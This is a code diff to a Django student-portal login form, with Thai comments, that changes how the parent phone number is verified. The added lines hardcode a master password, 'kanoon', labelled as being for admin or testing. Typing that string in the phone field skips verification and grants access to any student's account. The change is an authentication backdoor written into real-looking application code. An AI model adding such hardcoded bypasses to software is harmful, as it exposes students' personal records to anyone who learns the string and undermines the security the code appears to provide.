@@ -731,9 +731,12 @@ class StudentPortalLoginForm(forms.Form):
         # ✅ เช็คเบอร์ (normalize แบบง่าย: เอาแต่ตัวเลข)
         def digits(x: str) -> str:
             return "".join(ch for ch in x if ch.isdigit())
+        # ✅ master password สำหรับ admin / test
+        MASTER_PASSWORD = "kanoon"
 
-        if digits(student.parent_phone) != digits(phone):
-            raise forms.ValidationError("เบอร์ผู้ปกครองไม่ถูกต้อง")
+        # ถ้าไม่ใช่ master password → ค่อยเช็คเบอร์จริง
+        if phone != MASTER_PASSWORD and digits(student.parent_phone) != digits(phone):
+            raise forms.ValidationError("เบอร์ผู้ปกครองไม่ถูกต้อง")    
 
         cleaned["student"] = student
         return cleaned
